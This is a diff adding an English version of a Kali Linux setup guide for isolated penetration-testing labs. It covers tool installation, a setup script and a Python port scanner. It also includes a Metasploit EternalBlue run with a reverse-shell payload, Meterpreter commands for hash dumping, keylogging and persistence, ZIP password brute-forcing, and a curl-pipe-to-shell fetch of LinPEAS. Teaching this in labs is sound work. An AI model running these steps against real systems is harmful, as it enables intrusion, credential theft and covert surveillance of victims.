@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Kali Linux 설치 및 초기 설정 완전 가이드
 
 ## 1. 설치 후 필수 초기 작업
@@ -866,5 +872,863 @@ ip addr add 192.168.56.100/24 dev eth1
 ip link set eth1 up
 
 # 라우팅 확인
+ip route show
+```
+
+---
+
+<a name="english"></a>
+
+# Kali Linux Installation and Initial Setup: Complete Guide
+
+## 1. Essential Post-Installation Tasks
+
+### System Update
+
+Upgrade all packages to the latest version using the APT package manager. This must be run immediately after installing Kali Linux to apply the latest security patches.
+
+```bash
+apt-get update && apt-get upgrade -y
+apt-get dist-upgrade -y
+apt-get autoremove -y
+```
+
+### Installing VMware Tools
+
+Installs VMware Tools (guest additions) in a VMware virtual environment. Enables conveniences such as clipboard sharing and automatic screen resolution adjustment.
+
+```bash
+# VMware environment
+apt-get install open-vm-tools open-vm-tools-desktop -y
+```
+
+### Installing VirtualBox Guest Additions
+
+Installs VirtualBox Guest Additions to enhance functionality between the virtual machine and the host. Enables folder sharing, drag-and-drop, and similar features.
+
+```bash
+# 1. First mount the ISO as a CD-ROM
+cp /media/cdrom/VBoxLinuxAdditions.run ~
+chmod +x ~/VBoxLinuxAdditions.run
+./VBoxLinuxAdditions.run
+reboot
+```
+
+### Kali Initial Setup Automation Script
+
+Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.
+
+```bash
+#!/usr/bin/env bash
+# Kali Linux initial setup automation script
+# Usage: sudo bash kali_setup.sh [--skip-update] [--minimal]
+set -euo pipefail
+IFS=$'\n\t'
+
+# --- Color output ---
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+info()    { echo -e "${GREEN}[+]${NC} $*"; }
+warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
+error()   { echo -e "${RED}[-]${NC} $*" >&2; }
+
+# --- Option parsing ---
+SKIP_UPDATE=false
+MINIMAL=false
+for arg in "$@"; do
+    case $arg in
+        --skip-update) SKIP_UPDATE=true ;;
+        --minimal)     MINIMAL=true ;;
+    esac
+done
+
+# --- Root check ---
+if [[ $EUID -ne 0 ]]; then
+    error "Must run as root: sudo bash $0"
+    exit 1
+fi
+
+LOG_FILE="/var/log/kali_setup_$(date +%Y%m%d_%H%M%S).log"
+exec > >(tee -a "$LOG_FILE") 2>&1
+info "Log location: $LOG_FILE"
+
+# --- System update ---
+if [[ "$SKIP_UPDATE" == false ]]; then
+    info "Updating system packages..."
+    apt-get update -qq
+    DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -qq
+    apt-get autoremove -y -qq
+    info "Update complete"
+fi
+
+# --- Core tool installation ---
+CORE_PACKAGES=(
+    nmap masscan wireshark tcpdump netcat-traditional socat
+    john hashcat hydra medusa
+    burpsuite sqlmap nikto gobuster ffuf
+    aircrack-ng reaver wifite bettercap
+    impacket-scripts python3-impacket evil-winrm
+    git curl wget vim tmux screen
+    python3-pip python3-venv
+)
+
+EXTRA_PACKAGES=(
+    metasploit-framework msfdb
+    volatility3 foremost binwalk
+    bloodhound neo4j
+    crackmapexec
+)
+
+if [[ "$MINIMAL" == false ]]; then
+    ALL_PACKAGES=("${CORE_PACKAGES[@]}" "${EXTRA_PACKAGES[@]}")
+else
+    ALL_PACKAGES=("${CORE_PACKAGES[@]}")
+    warn "--minimal mode: installing core tools only"
+fi
+
+info "Installing tools (${#ALL_PACKAGES[@]} packages)..."
+DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${ALL_PACKAGES[@]}" \
+    || warn "Some packages failed to install (continuing)"
+
+# --- Python security tools ---
+info "Installing Python security libraries..."
+pip3 install --quiet --upgrade pip
+pip3 install --quiet pwntools scapy requests colorama dnspython
+
+# --- .bashrc customization ---
+BASHRC_APPEND='
+# === Kali Security Environment Settings ===
+PS1="\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "
+
+alias ll="ls -alh --color=auto"
+alias la="ls -A --color=auto"
+alias ..="cd .."
+alias ...="cd ../.."
+alias grep="grep --color=auto"
+alias ports="ss -tuln"
+alias myip="curl -s ifconfig.me && echo"
+alias update="apt-get update && apt-get upgrade -y"
+alias msfstart="service postgresql start && msfdb init 2>/dev/null; msfconsole"
+alias scan="nmap -sC -sV -oN"
+
+# Enhanced history
+HISTSIZE=50000
+HISTFILESIZE=100000
+HISTTIMEFORMAT="%F %T "
+HISTCONTROL=ignoredups:erasedups
+shopt -s histappend
+PROMPT_COMMAND="history -a; $PROMPT_COMMAND"
+
+# PATH augmentation
+export PATH="$PATH:/opt/tools/bin:$HOME/.local/bin"
+'
+
+TARGET_BASHRC="/root/.bashrc"
+if ! grep -q "Kali Security Environment Settings" "$TARGET_BASHRC" 2>/dev/null; then
+    echo "$BASHRC_APPEND" >> "$TARGET_BASHRC"
+    info ".bashrc customization complete"
+else
+    warn ".bashrc already configured (skipping)"
+fi
+
+# --- Vim configuration ---
+cat > /root/.vimrc << 'VIMEOF'
+syntax on
+set number relativenumber
+set tabstop=4 shiftwidth=4 expandtab
+set autoindent smartindent
+set hlsearch incsearch ignorecase smartcase
+set background=dark
+set mouse=a
+set clipboard=unnamedplus
+colorscheme desert
+VIMEOF
+info "Vim configuration complete"
+
+# --- SSH server hardening ---
+SSHD_CONFIG="/etc/ssh/sshd_config"
+if [[ -f "$SSHD_CONFIG" ]]; then
+    cp "$SSHD_CONFIG" "${SSHD_CONFIG}.bak.$(date +%Y%m%d)"
+    sed -i 's/^#*PermitRootLogin.*/PermitRootLogin prohibit-password/' "$SSHD_CONFIG"
+    sed -i 's/^#*MaxAuthTries.*/MaxAuthTries 3/' "$SSHD_CONFIG"
+    sed -i 's/^#*LoginGraceTime.*/LoginGraceTime 30/' "$SSHD_CONFIG"
+    sed -i 's/^#*X11Forwarding.*/X11Forwarding no/' "$SSHD_CONFIG"
+    info "SSH security settings applied"
+fi
+
+# --- Metasploit DB initialization ---
+if [[ "$MINIMAL" == false ]]; then
+    info "Initializing Metasploit database..."
+    service postgresql start 2>/dev/null || true
+    msfdb init 2>/dev/null || warn "MSF DB init failed (run 'msfdb init' manually)"
+fi
+
+# --- Completion summary ---
+echo ""
+echo "========================================"
+info "Kali initial setup complete!"
+echo "========================================"
+echo "  Log: $LOG_FILE"
+echo "  Apply changes: source ~/.bashrc"
+echo "  Start MSF: msfstart"
+echo "========================================"
+```
+
+---
+
+## 2. Korean Input Method Setup
+
+Installs a Korean input method on Kali Linux. After installing the `nabi` input method and `im-switch` and rebooting, you can switch between Korean and English with Shift+Space.
+
+```bash
+apt-get install nabi -y
+apt-get install im-switch -y
+im-switch -s nabi
+im-switch -c
+reboot
+# After reboot, use Shift + Space to toggle Korean/English
+```
+
+---
+
+## 3. Essential Security Tool Installation
+
+### Network Analysis
+
+Installs network analysis tools in bulk. Includes nmap (port scanning), masscan (high-speed scanning), wireshark (packet analysis), tcpdump (CLI capture), netcat (connection tool), and socat (multi-protocol relay).
+
+```bash
+apt-get install -y \
+  nmap \
+  masscan \
+  wireshark \
+  tcpdump \
+  netcat-traditional \
+  socat \
+  hping3 \
+  arpspoof \
+  ettercap-text-only
+```
+
+### Web Hacking
+
+Installs web application vulnerability analysis tools. Includes burpsuite (proxy), sqlmap (SQL injection automation), nikto (server scanning), gobuster (directory brute-forcing), and wfuzz (web fuzzer).
+
+```bash
+apt-get install -y \
+  burpsuite \
+  sqlmap \
+  nikto \
+  dirb \
+  gobuster \
+  wfuzz \
+  whatweb \
+  wafw00f
+```
+
+### Password Cracking
+
+Installs password cracking tools. Includes john (general-purpose cracker), hashcat (GPU-accelerated), hydra (online brute-force), medusa (parallel login), crunch (wordlist generator), and cewl (web-based wordlist).
+
+```bash
+apt-get install -y \
+  john \
+  hashcat \
+  hydra \
+  medusa \
+  crunch \
+  cewl \
+  ophcrack
+```
+
+### Exploit Framework
+
+Initial setup for Metasploit Framework. Start PostgreSQL and initialize the database with `msfdb init`. A connected MSF database provides benefits such as scan result storage and faster search.
+
+```bash
+# Metasploit Framework is pre-installed on Kali
+msfupdate                    # Update DB
+service postgresql start     # Start DB
+msfdb init                   # Initialize MSF DB
+msfconsole                   # Launch MSF
+```
+
+### Wireless Hacking
+
+Installs Wi-Fi security testing tools. Includes aircrack-ng (WEP/WPA crack suite), reaver (WPS attack), pixiewps (WPS Pixie-Dust attack), wifite (automated wireless attack), and bettercap (MITM framework).
+
+```bash
+apt-get install -y \
+  aircrack-ng \
+  reaver \
+  pixiewps \
+  wifite \
+  bettercap
+```
+
+---
+
+## 4. Convenience Configuration
+
+### .bashrc Customization
+
+Adds custom settings to the ~/.bashrc file. Improves workflow efficiency through aliases, environment variables, and prompt customization.
+
+```bash
+cat >> ~/.bashrc << 'EOF'
+
+# Color prompt
+PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+
+# Useful aliases
+alias ll='ls -alh'
+alias la='ls -A'
+alias ..='cd ..'
+alias ...='cd ../..'
+alias grep='grep --color=auto'
+alias ports='netstat -tuln'
+alias myip='curl -s ifconfig.me'
+alias update='apt-get update && apt-get upgrade -y'
+
+# History settings
+HISTSIZE=10000
+HISTFILESIZE=20000
+HISTTIMEFORMAT="%F %T "
+
+EOF
+source ~/.bashrc
+```
+
+### Vim Configuration
+
+Configures the Vim editor settings file (.vimrc). Optimizes the editing environment with syntax highlighting, auto-indentation, and line number display.
+
+```bash
+cat > ~/.vimrc << 'EOF'
+syntax on
+set number
+set tabstop=4
+set shiftwidth=4
+set expandtab
+set autoindent
+set hlsearch
+set incsearch
+set ignorecase
+set smartcase
+set background=dark
+colorscheme desert
+EOF
+```
+
+---
+
+## 5. Metasploit Framework Basic Usage
+
+### Initial Setup
+```bash
+service postgresql start
+msfdb init
+msfconsole
+```
+
+### Basic Commands
+```
+msf6 > help                  # Help
+msf6 > search type:exploit   # Search modules
+msf6 > search ms17-010       # Search for EternalBlue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > show options          # Show options
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set LHOST 192.168.1.50
+msf6 > set payload windows/x64/meterpreter/reverse_tcp
+msf6 > run                   # Execute attack
+```
+
+### Meterpreter Basic Commands
+```
+meterpreter > sysinfo        # System information
+meterpreter > getuid         # Current user
+meterpreter > getsystem      # Attempt privilege escalation
+meterpreter > hashdump       # Dump password hashes
+meterpreter > shell          # Get shell
+meterpreter > upload file.exe C:\\temp\\  # Upload file
+meterpreter > download C:\\passwords.txt  # Download file
+meterpreter > screenshot     # Take screenshot
+meterpreter > keyscan_start  # Start keylogger
+meterpreter > keyscan_dump   # Dump keylogger output
+meterpreter > run persistence -U -i 5 -p 4444 -r LHOST  # Maintain persistence
+```
+
+---
+
+## 6. Armitage (Metasploit GUI)
+
+Armitage is a graphical front-end for Metasploit Framework. The PostgreSQL database must be started before launching Armitage.
+
+```bash
+# Launch sequence
+service postgresql start
+msfdb init
+armitage &
+
+# Key features in Armitage
+# Hosts > Nmap Scan → scan targets
+# Attacks > Find Attacks → auto attack list based on vulnerabilities
+# Manage Meterpreter sessions via GUI after exploitation
+```
+
+---
+
+## 7. Wireshark Setup
+
+### Running Wireshark as a Non-Root User
+
+Adds the user to the wireshark group so non-root users can capture packets with Wireshark. A re-login is required after the change.
+
+```bash
+usermod -aG wireshark $USER
+# Log out and log back in
+```
+
+### tcpdump Basic Usage (CLI)
+
+tcpdump is a CLI-based packet capture tool used to capture and analyze packets in real time from network interfaces.
+
+```bash
+tcpdump -i eth0                    # Capture on eth0 interface
+tcpdump -i eth0 port 80            # HTTP traffic only
+tcpdump -i eth0 host 192.168.1.100  # Specific host
+tcpdump -i eth0 -w capture.pcap    # Save to file
+tcpdump -r capture.pcap            # Read saved file
+tcpdump -i eth0 -n -nn             # Display IPs/ports as numbers
+tcpdump -i eth0 'tcp flags & (rst|syn) != 0'  # SYN/RST packets only
+```
+
+---
+
+## 8. Port Scanning Basics (Nmap)
+
+Use Nmap to discover hosts on a network and scan ports. It is one of the first tools run during the reconnaissance phase of a penetration test.
+
+```python
+#!/usr/bin/env python3
+"""
+Multithreaded TCP port scanner — includes banner grabbing and service identification
+"""
+import argparse
+import ipaddress
+import socket
+import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from typing import Optional
+
+
+COMMON_PORTS = [
+    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
+    443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432,
+    5900, 6379, 8080, 8443, 8888, 27017,
+]
+
+SERVICE_NAMES: dict[int, str] = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+    53: "DNS", 80: "HTTP", 110: "POP3", 135: "RPC",
+    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
+    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
+    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
+    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+    27017: "MongoDB",
+}
+
+
+def grab_banner(host: str, port: int, timeout: float) -> Optional[str]:
+    """Receive banner string from an open port."""
+    probes = {
+        80: b"HEAD / HTTP/1.0\r\n\r\n",
+        8080: b"HEAD / HTTP/1.0\r\n\r\n",
+        8443: b"HEAD / HTTP/1.0\r\n\r\n",
+        21: None, 22: None, 25: None,  # server sends first
+    }
+    try:
+        with socket.create_connection((host, port), timeout=timeout) as sock:
+            probe = probes.get(port, b"\r\n")
+            if probe:
+                sock.sendall(probe)
+            data = sock.recv(1024)
+            return data.decode("utf-8", errors="replace").strip()[:80]
+    except Exception:
+        return None
+
+
+def scan_port(host: str, port: int, timeout: float, banner: bool) -> Optional[dict]:
+    """Scan a single port. Returns a result dict if open."""
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            result: dict = {
+                "port": port,
+                "service": SERVICE_NAMES.get(port, "unknown"),
+                "banner": "",
+            }
+            if banner:
+                result["banner"] = grab_banner(host, port, timeout) or ""
+            return result
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return None
+
+
+def parse_ports(port_spec: str) -> list[int]:
+    """Convert '22,80,1000-2000' format to a list of ports."""
+    ports: list[int] = []
+    for part in port_spec.split(","):
+        part = part.strip()
+        if "-" in part:
+            start, end = part.split("-", 1)
+            ports.extend(range(int(start), int(end) + 1))
+        elif part == "common":
+            ports.extend(COMMON_PORTS)
+        else:
+            ports.append(int(part))
+    return sorted(set(ports))
+
+
+def scan_host(host: str, ports: list[int], workers: int, timeout: float, banner: bool) -> None:
+    open_ports: list[dict] = []
+
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = {pool.submit(scan_port, host, p, timeout, banner): p for p in ports}
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                open_ports.append(result)
+
+    open_ports.sort(key=lambda x: x["port"])
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    print(f"\nScan results: {host}  [{ts}]")
+    print(f"{'Port':<8}{'Service':<14}{'Banner'}")
+    print("-" * 70)
+    if open_ports:
+        for r in open_ports:
+            print(f"{r['port']:<8}{r['service']:<14}{r['banner']}")
+    else:
+        print("  No open ports found")
+    print(f"\n{len(open_ports)} port(s) open / {len(ports)} scanned")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Multithreaded TCP port scanner (with banner grabbing)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""Examples:
+  python3 portscan.py 192.168.1.1
+  python3 portscan.py 192.168.1.1 -p 1-1024
+  python3 portscan.py 192.168.1.1 -p common --banner -w 200
+  python3 portscan.py 192.168.1.1 -p 22,80,443,3306,3389
+        """,
+    )
+    parser.add_argument("host", help="Target host IP or domain")
+    parser.add_argument(
+        "-p", "--ports",
+        default="common",
+        help="Port range: '22,80', '1-1024', 'common' (default: common)",
+    )
+    parser.add_argument("-w", "--workers", type=int, default=100, help="Concurrent threads (default: 100)")
+    parser.add_argument("-t", "--timeout", type=float, default=1.0, help="Connection timeout in seconds (default: 1.0)")
+    parser.add_argument("--banner", action="store_true", help="Enable banner grabbing")
+
+    args = parser.parse_args()
+
+    try:
+        resolved = socket.gethostbyname(args.host)
+    except socket.gaierror:
+        sys.exit(f"[!] Cannot resolve hostname: {args.host}")
+
+    try:
+        ports = parse_ports(args.ports)
+    except ValueError as e:
+        sys.exit(f"[!] Invalid port format: {e}")
+
+    print(f"[*] Target: {args.host} ({resolved})")
+    print(f"[*] Ports: {len(ports)}  |  Threads: {args.workers}  |  Timeout: {args.timeout}s")
+
+    scan_host(resolved, ports, args.workers, args.timeout, args.banner)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 9. Recommended Lab Environment
+
+| Virtual Machine | Role | Recommended OS |
+|---------|------|---------|
+| Attacker | Attacker machine | Kali Linux |
+| Target-1 | Vulnerable Linux server | Metasploitable2 |
+| Target-2 | Vulnerable Windows server | Windows Server 2008 (unpatched) |
+| Web Target | Web vulnerability practice | DVWA, WebGoat |
+
+### Network Configuration
+- Set all VMs to **Host-only** or **Internal Network** mode
+- Block internet access to create a safe lab environment
+- Attacker machine and targets must share the same network range
+
+---
+
+## 10. Kali Essential Command Categories
+
+### Information Gathering
+
+List of information gathering tools included in Kali Linux. Combine nmap (port/service scan), masscan (ultra-fast scan), theHarvester (OSINT), recon-ng (reconnaissance framework), and shodan (internet device search) as needed.
+
+```bash
+nmap           # Port scanning, service detection
+masscan        # Ultra-fast port scanning (internet-scale)
+theHarvester   # Email/domain OSINT
+recon-ng       # Modular reconnaissance framework
+maltego        # Graph-based OSINT
+dnsenum        # DNS enumeration
+dnsrecon       # DNS reconnaissance
+fierce         # DNS brute-force
+shodan         # Internet device search
+```
+
+### Vulnerability Analysis
+
+List of vulnerability scanner tools. Use Nessus, OpenVAS, etc. to automatically detect known vulnerabilities in a system.
+
+```bash
+nessus         # Commercial vulnerability scanner (evaluation)
+openvas        # Open-source vulnerability scanner
+nikto          # Web server vulnerability scan
+wpscan         # WordPress vulnerability scan
+joomscan       # Joomla vulnerability scan
+lynis          # Linux system security audit
+```
+
+### Web Application
+
+Web hacking tools built into Kali Linux. Burp Suite is the most widely used as a web proxy and scanner.
+
+```bash
+burpsuite      # Web proxy and scanner
+zaproxy        # OWASP ZAP (open-source web scanner)
+sqlmap         # SQL injection automation
+dirb           # Web directory brute-force
+gobuster       # High-performance directory/subdomain scanning
+ffuf           # High-performance web fuzzer
+wfuzz          # Web fuzzer
+commix         # Command injection tool
+whatweb        # Web technology stack detection
+```
+
+### Password Attacks
+
+List of password cracking tools. John the Ripper is used for offline cracking; Hydra is used for online brute-force.
+
+```bash
+john           # John the Ripper (offline cracking)
+hashcat        # GPU-based hash cracking
+hydra          # Online brute-force (multi-protocol)
+medusa         # Parallel login brute-forcer
+ncrack         # Network authentication cracking
+crunch         # Custom wordlist generation
+cewl           # Web page-based wordlist generation
+```
+
+### Exploitation
+
+Exploit tools based on Metasploit Framework. msfconsole is the core interface.
+
+```bash
+msfconsole     # Metasploit Framework
+searchsploit   # Offline Exploit-DB search
+armitage       # Metasploit GUI
+beef           # Browser exploit framework
+```
+
+### Sniffing & Spoofing
+
+Network sniffing and spoofing tools. Wireshark is used for GUI-based packet analysis; tcpdump for CLI-based capture.
+
+```bash
+wireshark      # GUI packet analysis
+tcpdump        # CLI packet capture
+ettercap       # Man-in-the-middle attack (MITM)
+bettercap      # Advanced MITM framework
+arpspoof       # ARP spoofing
+dsniff         # Password sniffing toolkit
+```
+
+### Wireless
+
+Wi-Fi security testing tools including aircrack-ng (WEP/WPA crack suite), reaver (WPS attack), pixiewps (WPS Pixie-Dust attack), wifite (automated wireless attack), and bettercap (MITM framework).
+
+```bash
+aircrack-ng    # WEP/WPA crack suite
+airodump-ng    # Wireless network packet capture
+aireplay-ng    # Packet injection (deauth, etc.)
+airmon-ng      # Monitor mode management
+reaver         # WPS brute-force
+wifite         # Automated wireless attack
+kismet         # Wireless IDS/detection
+```
+
+### Post Exploitation
+
+Metasploit Meterpreter post-exploitation commands and LinPEAS usage. LinPEAS automatically searches for privilege escalation opportunities on Linux systems and is used for internal reconnaissance immediately after gaining access.
+
+```bash
+# In a Meterpreter session
+getsystem      # Privilege escalation
+hashdump       # Hash extraction
+run post/multi/recon/local_exploit_suggester  # Privilege escalation suggestions
+
+# LinPEAS — automated Linux privilege escalation enumeration
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# LinEnum — Linux enumeration script
+./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
+```
+
+### Forensics
+
+Digital forensics tools. Autopsy is a comprehensive GUI-based forensics analysis platform.
+
+```bash
+autopsy        # Digital forensics GUI
+volatility     # Memory forensics
+foremost       # File carving
+dd             # Disk imaging
+md5sum/sha256sum  # Integrity verification
+strings        # Extract strings from binaries
+binwalk        # Firmware analysis
+```
+
+---
+
+## 11. BackTrack/Kali Penetration Testing Phases
+
+```
+Standard penetration testing phases:
+1. Information Gathering
+   - Web search engines (Google Dorks, Harvester)
+   - DNS information gathering (NSlookup, dig, dnsenum, fierce)
+   - SNMP information gathering (SNMPcheck, Onesixtyone)
+   - ICMP information gathering (Scapy, traceroute)
+   - Whois / Netcraft / Host information gathering
+
+2. Scanning
+   - Port scanning (Nmap, Masscan)
+   - Service version detection
+   - OS fingerprinting
+
+3. Vulnerability Analysis
+   - Metasploit search modules
+   - Nessus / OpenVAS
+
+4. Exploitation
+   - Metasploit Framework
+   - Armitage (GUI)
+
+5. Post Exploitation
+   - Meterpreter session utilization
+   - Privilege escalation / persistence
+```
+
+### BackTrack → Kali Linux Transition History
+```
+BackTrack 5 r3 → Kali Linux 1.0 (2013)
+- BackTrack was Ubuntu-based
+- Kali Linux transitioned to Debian-based
+- Package management: apt-get (same)
+- Tool set: mostly the same, but some paths/commands changed
+```
+
+---
+
+## 12. fcrackzip — ZIP File Password Cracking
+
+Crack passwords of encrypted ZIP files using fcrackzip. Supports both dictionary attacks and brute-force methods.
+
+```bash
+# Install
+apt-get install fcrackzip
+
+# Options
+# -b  : brute force
+# -D  : use dictionary file
+# -c  : specify character set
+#        a = lowercase, A = uppercase, 1 = digits, ! = special chars
+# -l  : character length range (e.g., 4-9 = 4 to 9 chars)
+# -u  : exclude incorrect passwords
+# -v  : verbose output
+# -p  : dictionary file path (dictionary mode)
+
+# Brute force (lowercase + digits, 4-9 chars)
+fcrackzip -b -v -l 4-9 -c a1 -u target.zip
+
+# Dictionary attack
+fcrackzip -D -p wordlist.txt -u target.zip
+```
+
+---
+
+## 13. IP Network Configuration (Lab Environment)
+
+### Static IP Configuration (Kali Linux)
+
+Assigns a static IP address to a network interface on Linux. This is the traditional method of directly editing the /etc/network/interfaces file.
+
+```bash
+# /etc/network/interfaces edit method
+auto eth0
+iface eth0 inet static
+    address 192.168.1.100
+    netmask 255.255.255.0
+    gateway 192.168.1.1
+    dns-nameservers 8.8.8.8 8.8.4.4
+
+# Apply
+service networking restart
+# or
+ifdown eth0 && ifup eth0
+```
+
+### nmcli (NetworkManager CLI)
+
+Manage network connections using NetworkManager CLI (nmcli). This is the preferred method for network configuration on modern Linux distributions.
+
+```bash
+# Check current connections
+nmcli con show
+
+# Set static IP
+nmcli con mod "Wired connection 1" \
+    ipv4.method manual \
+    ipv4.addresses "192.168.1.100/24" \
+    ipv4.gateway "192.168.1.1" \
+    ipv4.dns "8.8.8.8"
+
+# Restart connection
+nmcli con up "Wired connection 1"
+
+# Switch to DHCP
+nmcli con mod "Wired connection 1" ipv4.method auto
+```
+
+### Multiple Network Interface Configuration
+
+Configures multiple network interfaces simultaneously in a virtual environment. Used to separate internal and external networks or simulate multi-segment environments.
+
+```bash
+# Two NIC setup in VMware environment
+# eth0: NAT (internet access)
+# eth1: Host-only (lab network)
+
+ip addr add 192.168.56.100/24 dev eth1
+ip link set eth1 up
+
+# Check routing
 ip route show
 ```
